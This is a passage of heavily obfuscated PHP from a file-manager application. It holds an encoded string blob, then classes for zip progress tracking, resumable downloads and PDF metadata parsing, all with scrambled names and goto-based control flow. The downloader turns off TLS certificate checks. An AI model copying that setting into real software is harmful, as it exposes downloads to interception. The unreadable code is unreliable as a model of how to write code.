22\220\372\310\122\205\202\224\177\102\375\140\144\226\13\363\220\336\263\362\3\324\240\257\130\357\140\161\314\117\265\260\170\212\374\171\216\230\112\310\310\141\211\221".strrev('"¨«z“1§ u—$±|@µñË’‚$cá*Û'."\r".'ÃĞ0G3%l>ŠÁ}(×Ìâ„MpµjÚ—')."\xe1\x53\x29\x83\x37\xa0\xa0\x26\xc7\xaa\x78\x1\x82\x9d\xd\xd5\x6e\x4\x36\x2c\x2c\x5e\x15\x68\x9c\x6b\x80\x35\x8e\xa9\xcb\xd1\x10\x12\x87\xa1\xd8\x43\x9e\xfe\xb6\x3c\x13\x11\x64\xd7\xc8\xf5\xc4\x83\xdc\xc8\xa\x3a\xfb\xe1".base64_decode('lKPnU+LEt4Aq2EXUsh5YgGL3ECKAfuApPVhyQH9DXYJcjZEMsW8tL11UOoWqzM0moJiFLxc4Dl8=')."\165\266\156\130\305\242\361\325\57\334\224\205\341\376\311\145\53\236\315\230\252\263\104\65\360\61\237\270\267\0\41\261\242\164\232\205\164\15\255\360\126\50\133\3\4\23\44\101\75\50\142\147\124\246\146\351".base64_decode('IyCQC0fw+AlI/CI4fL8OsCspMthfhxx6QwByxYOeEVtPBI710lxJ+A8/JlcHk2Eh66XAAH/Ot14=')."\342\217\240\211\317\216\303\63\252\156\215\321\201\365\75\2\350\54\330\112\364\235\325\320\222\232\156\10\150\302\133\112\307\101\317\352\70\330\257\26\350\63\30\204\226\151\166\322\365\70\126\255\174\60\322\21".base64_decode('0zIm/Nl1+3PraAuHd2WWzRlRwxFBwjES1DW3+mJFiQhM34kkJQhn4dZbCfbCdQWjKql9QjLKRZ8=')."\x27\x3\xbf\xf0\xa9\x82\x0\x77\xc6\x80\x92\xf1\xe9\x9d\xa7\x2c\x33\x15\x15\x7b\xae\x41\x8b\x84\x2b\xdc\x61\x24\x11\x5\xf2\x6d\x8\xca\x98\x0\xb5\x44\xff\x78\x8a\xaa\x3d\x87\x99\x55\xf5\x54\x97\x5a\x48\xd9\xf1\x4b\x85\x4".base64_decode('g3J0MBhd1cBAcuK82gYXlhXOLeUyP+PmMmcq1S2Xq6Ay02kGBRCGikQd4UUV7sRXmRC/TvDSlYs=')."\12\104\254\204\362\27\127\354\355\102\363\206\301\311\265\102\101\360\252\106\310\215\203\20\116\222\271\315\303\105\351\32\312\50\247\270\77\75\134\107\266\75\344\237\264\76\14\303\320\230\30\6\160\220\22\272"."\xd3\x2\xb5\xf9\x11\x86\x27\x65\x74\x79\xb5\x25\x91\xbd\xa9\x50\x7c\xd5\x2d\xac\x85\x14\xfa\x84\xe2\xc4\x9b\x8d\x59\x33\x44\xaa\x7f\x84\xd3\xab\xb5\x8b\x23\xb6\xfb\x14\x1b\xb\xe5\xc8\x74\x65\xd3\x2c\x3\x22\x30\x58\xd6\x58"."\202\31\26\23\55\125\264\17\67\332\106\160\132\305\300\74\72\277\302\151\36\153\22\306\127\154\55\22\63\330\133\213\163\350\25\175\106\362\124\377\264\375\3\264\313\354\367\212\274\20\141\7\123\161\351\31"."\xd5\xaa\xe4\xc1\x35\xaa\x9a\xd\x27\xc1\x9c\x5c\x74\xb3\xe4\x35\x26\x54\x33\x99\xad\x9a\x17\x27\xc1\xbc\x15\xc9\x34\xb3\xb0\xe1\x16\xf2\x99\x72\xc9\x98\xa5\x79\x95\x9d\x87\xa6\x96\xad\xeb\x48\x83\xb9\x3\x70\x1\x75\xb6\xfe".base64_decode('rIpc+TlCPHZstImuXouqG/7ZalEVedZacGzb/WY1HklTqnBFfh1ZyX95WpXLUVwmXJzDFl3BimQ=').base64_decode('8aa1+l1suOosNqyXpDa42DFU62P7qafsfOS8QEiiARFs4dqlwliBulMCX+BuCqHJpEe39x+VAW0=')."\x1e\x7b\x29\x79\x16\x4a\x82\x97\xd8\xaa\x2e\x7f\x1d\x70\x63\x5c\xb9\xf3\xcc\x51\x67\x5b\xa2\x43\x64\xbc\x63\xd1\x4c\x35\x29\xe8\x68\x40\xa0\xe8\xd3\x17\xa7\xd3\x8f\xe4\xf8\x31\x19\x11\x20\xf0\xd5\x9b\x4f\x54\x39\x46\xb5\x55"."\341\143\361\354\172\323\162\227\127\45\335\305\217\115\55\36\243\321\243\143\314\214\34\257\350\344\340\30\137\163\40\165\32\2\351\232\202\33\56\7\136\50\161\162\104\323\115\150\136\16\230\171\21\375\166\151"."\246\111\171\14\20\213\21\46\222\373\220\367\32\341\362\26\204\370\253\256\260\157\321\231\65\42\124\304\120\120\220\134\270\300\315\151\104\301\251\210\15\131\42\360\54\234\105\302\225\207\336\335\45\333\15\17"."\7\200\155\145\102\233\44\104\200\336\213\341\365\201\207\326\244\133\354\262\35\177\201\200\120\241\170\25\215\364\277\14\67\116\161\23\135\161\47\52\303\111\36\25\144\272\142\44\173\12\115\54\346\377\362\253"."\112\40\147\174\274\10\374\162\65\72\47\202\17\276\373\127\7\42\321\110\105\122\310\23\211\14\5\303\76\254\157\132\221\214\162\11\367\376\25\111\241\336\340\300\154\151\376\176\117\240\257\42\15\352\1\100"."\55\130\372\356\45\116\12\204\120\55\75\175\175\124\351\254\262\26\1\357\112\136\23\164\375\305\17\153\213\131\215\236\175\332\24\142\350\331\166\104\246\323\4\62\177\266\65\26\302\112\236\235\131\11\305\131"."\317\23\304\41\67\350\273\254\54\120\254\330\176\10\122\2\274\267\37\40\205\205\251\233\107\370\10\70\233\376\114\24\106\215\23\25\200\370\145\237\313\162\51\50\300\321\304\101\114\110\40\110\161\15\106\0"."\242\260\152\273\224\261\165\146\217\355\370\325\162\255\207\40\274\103\140\275\217\245\156\36\106\265\204\160\323\203\371\224\205\103\211\232\27\70\154\143\140\251\250\26\225\63\204\257\100\251\204\307\272\246\304\260"."\170\360\321\311\330\212\51\147\350\335\272\235\25\13\227\311\260\227\376\37\114\131\24\63\24\303\0\0", 10, -8))); goto b™•Ÿ¹òğ¡; Eˆ£ äÂš: class TaskZip extends TaskFileTransfer { protected function startAfter() { $B¢±„¶ß÷ =& $_SERVER[»„]; parent::startAfter(); Hook::bind($B¢±„¶ß÷[1480], array($this, $B¢±„¶ß÷[1475])); $dÜ¯…“åŒÁ =& $this->task; $dÜ¯…“åŒÁ[$B¢±„¶ß÷[1477]] = $B¢±„¶ß÷[1028]; if (!$dÜ¯…“åŒÁ[$B¢±„¶ß÷[1316]]) { $dÜ¯…“åŒÁ[$B¢±„¶ß÷[1316]] = LNG($B¢±„¶ß÷[1481]); } } protected function endAfter() { $fÛ®É¤®¨ =& $_SERVER[»„]; parent::endAfter(); Hook::unbind($fÛ®É¤®¨[1480], array($this, $fÛ®É¤®¨[1475])); } public function updateAfter() { $CßŸÂóÑ‰ =& $_SERVER[»„]; $a¨µ‡Øƒ½° =& $this->task; if (!$a¨µ‡Øƒ½°[$CßŸÂóÑ‰[966]] || !$a¨µ‡Øƒ½°[$CßŸÂóÑ‰[686]]) { return; } if ($a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1477]] == $CßŸÂóÑ‰[1028]) { $C»“¯ÒÇ… = $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1455]]; if ($a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1456]] != $CßŸÂóÑ‰[1028]) { $C»“¯ÒÇ… = 0; } $eˆÏö„•ÓÌ = ($a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1459]] + $C»“¯ÒÇ…) / $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[686]]; $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1410]] = $eˆÏö„•ÓÌ * 0.3; } else { if ($a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1477]] == $CßŸÂóÑ‰[297]) { $eˆÏö„•ÓÌ = $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[978]] / $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[966]]; $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1410]] = 0.3 + $eˆÏö„•ÓÌ * 0.5; } else { if ($a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1477]] == $CßŸÂóÑ‰[102]) { $eˆÏö„•ÓÌ = 0; if ($a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1454]]) { $eˆÏö„•ÓÌ = $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1455]] / $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1454]]; } $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1410]] = 0.3 + 0.5 + $eˆÏö„•ÓÌ * 0.2; } } } if ($a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1410]] > 0) { $Aµ¸–ç†ñ = timeFloat() - $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1412]] - $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1415]]; $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1416]] = $Aµ¸–ç†ñ * (1 - $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1410]]) / $a¨µ‡Øƒ½°[$CßŸÂóÑ‰[1410]]; } } public function copyFileStart($a—Äõ±›“Ò, $c‡‹±Á„ßÔ, $cŸ·ŠÈöÏ, $EøéÅó¼¦ö, $F±Îñô¼Ù“, $Dµ‹áİë³Ã) { $d× éˆñÁ =& $_SERVER[»„]; parent::copyFileStart($a—Äõ±›“Ò, $c‡‹±Á„ßÔ, $cŸ·ŠÈöÏ, $EøéÅó¼¦ö, $F±Îñô¼Ù“, $Dµ‹áİë³Ã); $cñŠÎ¹¶Ó =& $this->task; if ($cñŠÎ¹¶Ó[$d× éˆñÁ[1477]] == $d× éˆñÁ[297]) { $cñŠÎ¹¶Ó[$d× éˆñÁ[1477]] = $d× éˆñÁ[102]; } $this->update(); } public function copyFileEnd($cö³®‡›È, $dÛÑ¢§æš, $AÙÉŠ˜ƒğï, $D­÷Øˆ§õ—, $D†Ì¯øŞ“¦, $f¹÷Ó¤îº) { $E­İªË¶Ä =& $_SERVER[»„]; $DÉÃ»òàî =& $this->task; $DÉÃ»òàî[$E­İªË¶Ä[1455]] = $DÉÃ»òàî[$E­İªË¶Ä[1454]]; $DÉÃ»òàî[$E­İªË¶Ä[1459]] += $DÉÃ»òàî[$E­İªË¶Ä[1454]]; $DÉÃ»òàî[$E­İªË¶Ä[1456]] = $E­İªË¶Ä[33]; $this->update(); } public function nameParse($EÒ²Î™£ÖÖ) { $AóÅ©‘²« =& $_SERVER[»„]; $F’¹ç†„ì› =& $this->task; if ($F’¹ç†„ì›[$AóÅ©‘²«[978]] < $F’¹ç†„ì›[$AóÅ©‘²«[966]]) { $EõŞùğïƒ = get_path_this($EÒ²Î™£ÖÖ); if (strstr($EõŞùğïƒ, $AóÅ©‘²«[91])) { $F’¹ç†„ì›[$AóÅ©‘²«[978]] += 1; } } if ($F’¹ç†„ì›[$AóÅ©‘²«[1477]] == $AóÅ©‘²«[1028]) { $F’¹ç†„ì›[$AóÅ©‘²«[1477]] = $AóÅ©‘²«[297]; } $F’¹ç†„ì›[$AóÅ©‘²«[1452]] = $EÒ²Î™£ÖÖ; $this->update(); } } class Downloader { static function start($AÜ™ËßÅ ‘, $aÆ…Ğ×İ¢, $cÛÀ¼ÄªõŒ = 10) { goto BÑ¨½œäŒ; EñİÎÎ©æ: if ($bÂÚèÅÚä > $D·Û›ƒ·æ) { @unlink($FÂ²‡ÖîÊÏ); } file_put_contents($a‚ÕÓÃâÅğ, json_encode($FÉ‹â‚ïÔ×)); $D…ŒÛ†¢ = self::fileDownloadCurl($AÜ™ËßÅ ‘, $aÆ…Ğ×İ¢, !0, $bÂÚèÅÚä, $D·Û›ƒ·æ); goto eÚÂ„«ÂĞ¹; Bô¸à¨Š²‚: $FÂ²‡ÖîÊÏ = $aÆ…Ğ×İ¢ . $e”êÔ¿§º[1483]; if (is_array($AÜ™ËßÅ ‘)) { $CˆÉ–‹µ– = $AÜ™ËßÅ ‘; } else { $CˆÉ–‹µ– = url_header($AÜ™ËßÅ ‘); } $AÜ™ËßÅ ‘ = $CˆÉ–‹µ–[$e”êÔ¿§º[291]]; goto B‚ºõÅ´êƒ; B‚ºõÅ´êƒ: if (!$AÜ™ËßÅ ‘) { return array($e”êÔ¿§º[1020] => !1, $e”êÔ¿§º[1022] => $e”êÔ¿§º[1025]); } if (!$CˆÉ–‹µ–[$e”êÔ¿§º[1269]] || $CˆÉ–‹µ–[$e”êÔ¿§º[321]] == 0) { @unlink($FÂ²‡ÖîÊÏ); @unlink($aÆ…Ğ×İ¢); $D…ŒÛ†¢ = self::fileDownloadFopen($AÜ™ËßÅ ‘, $aÆ…Ğ×İ¢, $CˆÉ–‹µ–[$e”êÔ¿§º[321]]); if ($D…ŒÛ†¢[$e”êÔ¿§º[1020]]) { return $D…ŒÛ†¢; } else { @unlink($FÂ²‡ÖîÊÏ); @unlink($aÆ…Ğ×İ¢); $D…ŒÛ†¢ = self::fileDownloadCurl($AÜ™ËßÅ ‘, $aÆ…Ğ×İ¢, !1, 0, $CˆÉ–‹µ–[$e”êÔ¿§º[321]]); @unlink($FÂ²‡ÖîÊÏ); return $D…ŒÛ†¢; } } $bÂÚèÅÚä = is_file($FÂ²‡ÖîÊÏ) ? filesize($FÂ²‡ÖîÊÏ) : 0; goto a‹´îİë¿; BÑ¨½œäŒ: $e”êÔ¿§º =& $_SERVER[»„]; if (!request_url_safe($AÜ™ËßÅ ‘)) { return array($e”êÔ¿§º[1020] => !1, $e”êÔ¿§º[1022] => $e”êÔ¿§º[1025]); } $a‚ÕÓÃâÅğ = $aÆ…Ğ×İ¢ . $e”êÔ¿§º[1482]; goto Bô¸à¨Š²‚; Aè‘šó°íÎ: if (is_file($a‚ÕÓÃâÅğ)) { $f¸°´ê‘†Š = file_get_contents($a‚ÕÓÃâÅğ); $FÉ‹â‚ïÔ× = json_decode($f¸°´ê‘†Š, 1); } if (file_exists($aÆ…Ğ×İ¢) && $D·Û›ƒ·æ == filesize($aÆ…Ğ×İ¢)) { @unlink($FÂ²‡ÖîÊÏ); @unlink($a‚ÕÓÃâÅğ); return array($e”êÔ¿§º[1020] => !0, $e”êÔ¿§º[1022] => $e”êÔ¿§º[1485]); } if ($FÉ‹â‚ïÔ×[$e”êÔ¿§º[321]] != $D·Û›ƒ·æ) { $FÉ‹â‚ïÔ× = array($e”êÔ¿§º[321] => $D·Û›ƒ·æ); } goto EñİÎÎ©æ; a‹´îİë¿: $D·Û›ƒ·æ = intval($CˆÉ–‹µ–[$e”êÔ¿§º[321]]); if (file_exists($FÂ²‡ÖîÊÏ) && time() - filemtime($FÂ²‡ÖîÊÏ) < 3) { return array($e”êÔ¿§º[1020] => !1, $e”êÔ¿§º[1022] => $e”êÔ¿§º[1484]); } $FÉ‹â‚ïÔ× = array(); goto Aè‘šó°íÎ; eÚÂ„«ÂĞ¹: if ($D…ŒÛ†¢[$e”êÔ¿§º[1020]]) { @unlink($a‚ÕÓÃâÅğ); } return $D…ŒÛ†¢; goto a¢ ™›¾Ñæ; a¢ ™›¾Ñæ: } static function fileDownloadFopen($b†´†êİÆ, $e™‡¶¯øÍ, $F‹Çíä‡´Ø = 0) { $B’è°˜½› =& $_SERVER[»„]; @ini_set($B’è°˜½›[1486], $B’è°˜½›[1487]); $c‡…×Áè» = $e™‡¶¯øÍ . $B’è°˜½›[1483]; set_timeout(); @unlink($c‡…×Áè»); if ($B§š¨¦­ä¥ = @fopen($b†´†êİÆ, $B’è°˜½›[1488])) { goto f âÆØÈà; e”ìŠ»ãå‹: self::checkGzip($c‡…×Áè»); if (!@rename($c‡…×Áè», $e™‡¶¯øÍ)) { usleep(round(rand(0, 1000) * 50)); @unlink($e™‡¶¯øÍ); $bÕğ™£›¶ = @rename($c‡…×Áè», $e™‡¶¯øÍ); if (!$bÕğ™£›¶) { return array($B’è°˜½›[1020] => !1, $B’è°˜½›[1022] => $B’è°˜½›[1493]); } } return array($B’è°˜½›[1020] => !0, $B’è°˜½›[1022] => $B’è°˜½›[684]); goto bøÓ–„ÒÀä; E³ã“ÌîŞ : fclose($B§š¨¦­ä¥); $añ†Ï­½Óò = filesize(iconv_system($c‡…×Áè»)); if ($F‹Çíä‡´Ø != 0 && $añ†Ï­½Óò != $F‹Çíä‡´Ø) { return array($B’è°˜½›[1020] => !1, $B’è°˜½›[1022] => $B’è°˜½›[1492]); } goto e”ìŠ»ãå‹; f âÆØÈà: if (!($BĞéÃ©‡’å = @fopen($c‡…×Áè», $B’è°˜½›[1489]))) { return array($B’è°˜½›[1020] => !1, $B’è°˜½›[1022] => $B’è°˜½›[1490]); } while (!feof($B§š¨¦­ä¥)) { if (!file_exists($c‡…×Áè»)) { fclose($BĞéÃ©‡’å); return array($B’è°˜½›[1020] => !1, $B’è°˜½›[1022] => $B’è°˜½›[1491]); } clearstatcache(); if ($F‹Çíä‡´Ø > 0 && $F‹Çíä‡´Ø == filesize(iconv_system($c‡…×Áè»))) { break; } fwrite($BĞéÃ©‡’å, fread($B§š¨¦­ä¥, 1024 * 8), 1024 * 8); } fclose($BĞéÃ©‡’å); goto E³ã“ÌîŞ ; bøÓ–„ÒÀä: } else { return array($B’è°˜½›[1020] => !1, $B’è°˜½›[1022] => $B’è°˜½›[1494]); } } static function fileDownloadCurl($b’õ†§¶Ã°, $FëÍùˆ’‹¦, $f‹Õ´ò˜ = false, $AåïŠ…È°— = 0, $Dà¹éÚ¬ÀÜ = 0) { goto fëŒàŸÖ…; DáÎÊù‡Ã’: return array($Cºîøáõ‘[1020] => !1, $Cºîøáõ‘[1022] => $Cºîøáõ‘[1498]); goto FŸŞñøˆ‘Ö; Dœêï¢é: curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_USERAGENT, $Cºîøáõ‘[1487]); $fœÂÊçÕğ = curl_exec($DÄ‹¿Ú²ä¤); curl_progress_end($DÄ‹¿Ú²ä¤); goto D±¬Â¤Ê‚ ; Eˆ´ÜåÈ®Ü: if ($Fâ…ç‚‘Ğ• < $Dà¹éÚ¬ÀÜ && $Dà¹éÚ¬ÀÜ != 0) { return array($Cºîøáõ‘[1020] => !1, $Cºîøáõ‘[1022] => $Cºîøáõ‘[1484]); } if ($Fâ…ç‚‘Ğ• > $Dà¹éÚ¬ÀÜ && $Dà¹éÚ¬ÀÜ != 0) { return array($Cºîøáõ‘[1020] => !1, $Cºîøáõ‘[1022] => $Cºîøáõ‘[1492]); } if ($fœÂÊçÕğ && filesize($B˜©„¿‚ ©) != 0) { self::checkGzip($B˜©„¿‚ ©); if (!@rename($B˜©„¿‚ ©, $FëÍùˆ’‹¦)) { @unlink($FëÍùˆ’‹¦); $fœÂÊçÕğ = @rename($B˜©„¿‚ ©, $FëÍùˆ’‹¦); if (!$fœÂÊçÕğ) { return array($Cºîøáõ‘[1020] => !1, $Cºîøáõ‘[1022] => $Cºîøáõ‘[1497]); } } return array($Cºîøáõ‘[1020] => !0, $Cºîøáõ‘[1022] => $Cºîøáõ‘[684]); } goto DáÎÊù‡Ã’; aÂğï°öÒã: curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_SSL_VERIFYHOST, 0); goto DÌˆó ¨; fëŒàŸÖ…: $Cºîøáõ‘ =& $_SERVER[»„]; $B˜©„¿‚ © = $FëÍùˆ’‹¦ . $Cºîøáõ‘[1483]; set_timeout(); goto D£Ş¨ÏéŞ; EÃÄëš£…Í: if ($f‹Õ´ò˜) { curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_RANGE, $AåïŠ…È°— . $Cºîøáõ‘[702]); } curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_FILE, $fÈ—¶±×½ñ); curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_REFERER, get_url_link($b’õ†§¶Ã°)); goto aÂğï°öÒã; D±¬Â¤Ê‚ : curl_close($DÄ‹¿Ú²ä¤); fclose($fÈ—¶±×½ñ); $Fâ…ç‚‘Ğ• = filesize(iconv_system($B˜©„¿‚ ©)); goto Eˆ´ÜåÈ®Ü; D£Ş¨ÏéŞ: $fÈ—¶±×½ñ = @fopen($B˜©„¿‚ ©, $Cºîøáõ‘[970]); if (!$fÈ—¶±×½ñ) { return array($Cºîøáõ‘[1020] => !1, $Cºîøáõ‘[1022] => $Cºîøáõ‘[1495]); } $DÄ‹¿Ú²ä¤ = curl_init($b’õ†§¶Ã°); goto EÃÄëš£…Í; DÌˆó ¨: curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_NOPROGRESS, !1); curl_setopt($DÄ‹¿Ú²ä¤, CURLOPT_PROGRESSFUNCTION, $Cºîøáõ‘[1496]); curl_progress_start($DÄ‹¿Ú²ä¤); goto Dœêï¢é; FŸŞñøˆ‘Ö: } static function checkGzip($E„İÜï§›÷) { goto eÑ÷–’¬ÖÏ; cùÙòö¡áÍ: ob_start(); readgzfile($E„İÜï§›÷); $CµÏ§æğñì = ob_get_clean(); goto D±µ…ªÕÉ; D±µ…ªÕÉ: file_put_contents($E„İÜï§›÷, $CµÏ§æğñì); goto BªàÒÄˆ; eÑ÷–’¬ÖÏ: $BŞ¸¬°‚èÕ = $_SERVER[»„][1499]; $d…½„·¡›ª = file_sub_str($E„İÜï§›÷, 0, 2); if ($BŞ¸¬°‚èÕ != $d…½„·¡›ª) { return; } goto cùÙòö¡áÍ; BªàÒÄˆ: } } class FileParsePdf { public static function parse($D¡…ÌÌ¸š) { goto E†ğ”Š¨â‹; F†ëéä–‚Æ: preg_match_all($cÈøîÆ÷Ùµ, $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[1501]], $BóƒƒÅâØ); if ($BóƒƒÅâØ[1] && $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1508]] < $BóƒƒÅâØ[1][0]) { $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1508]] = $BóƒƒÅâØ[1][0]; } preg_match_all($cÈøîÆ÷Ùµ, $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[1502]], $BóƒƒÅâØ); goto fß«ºĞ™´±; E†ğ”Š¨â‹: $DíÂÕæÊ¡ =& $_SERVER[»„]; $aì„ ³Ñ › = 32 * 1024; $FÕèÜ‹ïŸï = array($DíÂÕæÊ¡[771] => fopen($D¡…ÌÌ¸š, $DíÂÕæÊ¡[1150]), $DíÂÕæÊ¡[75] => $D¡…ÌÌ¸š, $DíÂÕæÊ¡[77] => filesize($D¡…ÌÌ¸š), $DíÂÕæÊ¡[1500] => $aì„ ³Ñ ›); goto c™ìÎÇ§×; C¬®äÖ‰–: if ($F‚•éî„ÜÖ) { $d³ÃÌù¥çÎ = $F‚•éî„ÜÖ[$DíÂÕæÊ¡[1503]][$DíÂÕæÊ¡[1172]]; $F°ÖºâŠÄÅ = self::getObjectValue($FÕèÜ‹ïŸï, $F‚•éî„ÜÖ, $d³ÃÌù¥çÎ); } $F°ÖºâŠÄÅ = is_array($F°ÖºâŠÄÅ) ? $F°ÖºâŠÄÅ : array(); $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1504]] = 0; goto EíÃ‘µ„»¤; c™ìÎÇ§×: $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[1501]] = StreamWrapperIO::read($D¡…ÌÌ¸š, 0, $aì„ ³Ñ ›); $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[1502]] = StreamWrapperIO::read($D¡…ÌÌ¸š, $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[77]] - $aì„ ³Ñ ›, $aì„ ³Ñ ›); $F‚•éî„ÜÖ = self::decodeXref($FÕèÜ‹ïŸï); goto C¬®äÖ‰–; EíÃ‘µ„»¤: $cÈøîÆ÷Ùµ = $DíÂÕæÊ¡[1505]; preg_match($cÈøîÆ÷Ùµ, $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[1501]], $BóƒƒÅâØ); if (!$F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1504]] && count($BóƒƒÅâØ) == 5) { $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1504]] = $BóƒƒÅâØ[3]; $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1506]] = $BóƒƒÅâØ[4]; } goto C´ØÂ˜ÈĞÉ; CËİòÖ²¾¬: if ($BóƒƒÅâØ) { $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1315]] = $BóƒƒÅâØ[1]; } $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1508]] = 0; $cÈøîÆ÷Ùµ = $DíÂÕæÊ¡[1509]; goto F†ëéä–‚Æ; fß«ºĞ™´±: if ($BóƒƒÅâØ[1] && $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1508]] < $BóƒƒÅâØ[1][0]) { $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1508]] = $BóƒƒÅâØ[1][0]; } $F°ÖºâŠÄÅ = self::parseInfoItem($F°ÖºâŠÄÅ); return $F°ÖºâŠÄÅ; goto fºñ‡ˆøèÀ; C´ØÂ˜ÈĞÉ: preg_match($cÈøîÆ÷Ùµ, $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[1502]], $BóƒƒÅâØ); if (!$F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1504]] && count($BóƒƒÅâØ) == 5) { $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1504]] = $BóƒƒÅâØ[3]; $F°ÖºâŠÄÅ[$DíÂÕæÊ¡[1506]] = $BóƒƒÅâØ[4]; } preg_match($DíÂÕæÊ¡[1507], $FÕèÜ‹ïŸï[$DíÂÕæÊ¡[1501]], $BóƒƒÅâØ); goto CËİòÖ²¾¬; fºñ‡ˆøèÀ: } private static function parseInfoItem($EÍÊĞ³ã) { $BêÕèƒš™· =& $_SERVER[»„]; if (!$EÍÊĞ³ã) { return !1; } $FÀ„œÎôî = array($BêÕèƒš™·[1316] => array($BêÕèƒš™·[1510], $BêÕèƒš™·[33]), $BêÕèƒš™·[1511] => array($BêÕèƒš™·[1512], $BêÕèƒš™·[33]), $BêÕèƒš™·[183] => array($BêÕèƒš™·[1513], $BêÕèƒš™·[206]), $BêÕèƒš™·[106] => array($BêÕèƒš™·[1514], $BêÕèƒš™·[206]), $BêÕèƒš™·[1508] => array($BêÕèƒš™·[1508], $BêÕèƒš™·[272]), $BêÕèƒš™·[1504] => array($BêÕèƒš™·[1504], $BêÕèƒš™·[272]), $BêÕèƒš™·[1506] => array($BêÕèƒš™·[1506], $BêÕèƒš™·[272]), $BêÕèƒš™·[1515] => array($BêÕèƒš™·[1516], $BêÕèƒš™·[33]), $BêÕèƒš™·[1517] => array($BêÕèƒš™·[1518], $BêÕèƒš™·[33]), $BêÕèƒš™·[1519] => array($BêÕèƒš™·[1315], $BêÕèƒš™·[33])); $aœòÃâ”àƒ = array(); foreach ($FÀ„œÎôî as $bäÂÂÚ±«ë => $aÍµÍ³¹Ÿ£) { if (!isset($EÍÊĞ³ã[$aÍµÍ³¹Ÿ£[0]])) { continue; } $bÑÌ²Ğº‹» = $EÍÊĞ³ã[$aÍµÍ³¹Ÿ£[0]]; if (!$bÑÌ²Ğº‹» || is_array($bÑÌ²Ğº‹»)) { continue; } switch ($aÍµÍ³¹Ÿ£[1]) { case $BêÕèƒš™·[272]: $bÑÌ²Ğº‹» = intval($bÑÌ²Ğº‹»); break; case $BêÕèƒš™·[206]: if (substr($bÑÌ²Ğº‹», 0, 2) == $BêÕèƒš™·[1520]) { $bÑÌ²Ğº‹» = substr($bÑÌ²Ğº‹», 2, 14); } if (strtotime($bÑÌ²Ğº‹»)) { $bÑÌ²Ğº‹» = date($BêÕèƒš™·[1521], strtotime($bÑÌ²Ğº‹»)); } break; } $aœòÃâ”àƒ[$bäÂÂÚ±«ë] = $bÑÌ²Ğº‹»; } return $aœòÃâ”àƒ; } private static function decodeXref(&$bå¡É—ÒËÁ) { goto bïËÙ„ÌÎÄ; c‹ÑìĞïã: if (preg_match($BÃÜçè‰“Ã[1529], $c†Éâ’§Şí, $eæèâ³’Ğä) > 0) { $E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[77]] = intval($eæèâ³’Ğä[1]); } if (preg_match($BÃÜçè‰“Ã[1530], $c†Éâ’§Şí, $eæèâ³’Ğä) > 0) { $E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[1531]] = intval($eæèâ³’Ğä[1]) . $BÃÜçè‰“Ã[70] . intval($eæèâ³’Ğä[2]); } if (preg_match($BÃÜçè‰“Ã[1532], $c†Éâ’§Şí, $eæèâ³’Ğä) > 0) { $E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[1533]] = intval($eæèâ³’Ğä[1]) . $BÃÜçè‰“Ã[70] . intval($eæèâ³’Ğä[2]); } goto a—Ñ¹§êˆ±; fÜ‚É”µÏò: $d‘Õ¹¡²‚ = $BÃÜçè‰“Ã[1523]; if (!preg_match_all($d‘Õ¹¡²‚, $b¤¸˜¢£‹¾, $eæèâ³’Ğä, PREG_SET_ORDER, 0)) { return !1; } $a½àÄê¶¶ß = intval($eæèâ³’Ğä[0][1]); goto f«çŒØÏ‰×; a—Ñ¹§êˆ±: if (preg_match($BÃÜçè‰“Ã[1534], $c†Éâ’§Şí, $eæèâ³’Ğä) > 0) { $E¢°è†…Á‚[$BÃÜçè‰“Ã[1503]][$BÃÜçè‰“Ã[1172]] = intval($eæèâ³’Ğä[1]) . $BÃÜçè‰“Ã[70] . intval($eæèâ³’Ğä[2]); } if (preg_match($BÃÜçè‰“Ã[1535], $c†Éâ’§Şí, $eæèâ³’Ğä) > 0) { 